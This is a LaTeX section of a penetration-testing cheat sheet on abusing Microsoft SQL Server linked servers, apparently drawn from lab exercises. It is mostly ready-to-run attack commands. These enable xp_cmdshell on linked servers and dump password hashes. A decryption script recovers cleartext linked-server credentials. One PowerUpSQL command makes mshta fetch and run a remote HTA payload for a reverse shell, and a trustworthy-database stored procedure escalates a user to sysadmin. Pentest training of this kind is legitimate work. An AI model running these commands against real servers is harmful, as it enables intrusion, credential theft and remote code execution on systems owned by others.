\section{Communicate with Other Databases}
\label{mssql:link}



\subsection{Enumeration}

\subsubsection{PowerUpSQL}
\begin{verbatim}
import-module .\PowerUpSQL.ps1
Get-SQLServerLink
Get-SQLQuery  -Query "EXEC sp_helplinkedsrvlogin"
\end{verbatim}


\subsubsection{mssql}

Let's see how we can identify and execute queries on
linked servers.

\begin{verbatim}
SELECT srvname, isremote FROM master..sysservers
\end{verbatim}

see sysservers
\href{https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql}{Transact-SQL} for more information.

Next, we can attempt to identify the user used for the connection and its
privileges. The
\href{https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql}{EXECUTE}
statement can be used to send pass-through commands to linked servers. We add
our command between parenthesis and specify the linked server between square
brackets ([ ]).

\begin{verbatim}
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [SQL02\SQLEXPRESS]
select * from openquery("SQL02\SQLEXPRESS",'select IS_SRVROLEMEMBER(''sysadmin'')')

select * from openquery("SQL02\SQLEXPRESS", 'select * from master..sysservers')
\end{verbatim}

If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

\subsubsection{mssqlclient.py}

\begin{verbatim}
enum_links
\end{verbatim}


\subsection{Commands execution on linked server}

\subsubsection{mssql}

As we have seen, we can now execute queries with sysadmin privileges on the
linked server. As sysadmin, we control the SQL Server instance. We can read
data from any database or execute system commands with \verb+xp_cmdshell+.

\begin{verbatim}
select * from openquery("SQL02\SQLEXPRESS", 'exec xp_cmdshell ''whoami''')

EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "SQL02\SQLEXPRESS"
EXECUTE('xp_cmdshell "whoami"') AT "SQL02\SQLEXPRESS"


select * from openquery("ZSM-SVRCSQL02", 'select name,password_hash from sys.sql_logins where name=''sa''');
select * from openquery("ZSM-SVRCSQL02", 'select name,password_hash from sys.sql_logins ');
\end{verbatim}

\subsubsection{mssqlclient.py}

\begin{verbatim}
use_link "SQL02\SQLEXPRESS"
enable_xp_cmdshell
xp_cmdshell whoami
\end{verbatim}

\subsection{Extracting passwords from SQL Server Linked Servers}

An attacker can extract SQL Server Linked Servers passwords from the SQL Instances and get them in clear text, granting the attacker passwords that can be used to acquire a greater foothold on the target.

\begin{itemize}
    \item \href{https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#extracting-passwords-from-sql-server-linked-servers}{hacktricks}
    \item \href{https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-credential-passwords/}{Decrypting MSSQL Credential Passwords}
    \item \href{https://www.hackingarticles.in/mssql-for-pentester-abusing-linked-database/}{MSSQL for Pentester: Abusing Linked Database}
\end{itemize}


tool \href{https://github.com/IamLeandrooooo/SQLServerLinkedServersPasswords/}{DecryptLinkedServersPasswords.ps1}

can be launched by \verb+Administrator+ or inside db with \verb+sa+:
\begin{verbatim}
exec xp_cmdshell 'powershell -exec bypass c:\temp\DecryptLinkedServersPasswords.ps1'

MSSQLSERVER ZSM-SVRCSQL02 sa       VeryUncrackablePassword2022!
\end{verbatim}



\subsection{RevShell on linked server}

\href{https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/}{SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server}

with clear text creds of sa on linked server and powerupsql

\begin{verbatim}
Get-SQLServerLinkCrawl -Username sa -Password Password@1 -Instance WIN-P83OS778EQK\SQLEXPRESS -Query "exec master..xp_cmdshell 'mshta.exe http://192.168.1.2:8080/ugfFOJBvO.hta'"
\end{verbatim}


\begin{verbatim}
EXECUTE AS LOGIN = 'sa'
EXECUTE('sp_configure ''show advanced options'',1;reconfigure;') AT  "ZSM-SVRCSQL02"
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;')  AT "ZSM-SVRCSQL02"
\end{verbatim}

\subsection{Trustworthy databases}

\href{https://learn.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property?view=sql-server-ver16}{TRUSTWORTHY database}

If a user  hasn't been granted remote login permissions as a sysadmin, but instead has been provided public privileges as a local SQL User in target SQL instance, we can pursue a strategy to enumerate trusted databases on the targeted linked server. Our objective would be to determine if the user holds the \verb+db_owner+ role for any trusted database. If such a database is identified, we can create a stored procedure to enable \verb+xp_cmdshell+, ensuring it executes under the context of the \verb+OWNER+, which typically would be the \verb+sa+ user.


\subsubsection{Enumeration}

mssql:
\begin{verbatim}
    select * from openquery("SQL02\SQLEXPRESS",'select IS_SRVROLEMEMBER(''public'')')
    select * from openquery("SQL02\SQLEXPRESS",'select name FROM master.dbo.sysdatabases')
    select * from openquery("SQL02\SQLEXPRESS",
        'SELECT a.name,b.is_trustworthy_on 
            FROM master..sysdatabases as a 
            INNER JOIN sys.databases as b ON a.name=b.name;')

    select * from openquery("SQL02\SQLEXPRESS",
        'SELECT name as database_name, 
                SUSER_NAME(owner_sid) AS owner, 
                is_trustworthy_on AS TRUSTWORTHY 
            from sys.databases;')
\end{verbatim}

\verb+mssqlclient.py+:
\begin{verbatim}
use_link "SQL02\SQLEXPRESS"
enum_db
enum_users
SELECT name as database_name, 
        SUSER_NAME(owner_sid) AS owner, 
        is_trustworthy_on AS TRUSTWORTHY 
    FROM sys.databases;
\end{verbatim}


\subsubsection{Exploit}

mssql:
\begin{verbatim}
select is_rpc_out_enabled from sys.servers where name='SQL02\SQLEXPRESS'

EXEC ('CREATE PROCEDURE sp_escalate WITH EXECUTE AS OWNER 
        AS EXEC sp_addsrvrolemember ''htb-dbuser'',''sysadmin''') 
    AT "SQL02\SQLEXPRESS"

EXEC ('sp_escalate;
        SELECT IS_SRVROLEMEMBER(''sysadmin'');
        SELECT SUSER_NAME()') 
    AT "SQL02\SQLEXPRESS"

EXECUTE('sp_configure ''xp_cmdshell'',1;
        reconfigure;') 
    AT "SQL02\SQLEXPRESS"

EXECUTE('xp_cmdshell "whoami"') AT "SQL02\SQLEXPRESS"
\end{verbatim}


\verb+mssqlclient.py+:
\begin{verbatim}
USE "htb-reports"
SELECT is_srvrolemember('sysadmin')
exec master.dbo.sp_configure "show advanced options",1;RECONFIGURE;exec master.dbo.sp_configure "xp_cmdshell", 1;RECONFIGURE;
\end{verbatim}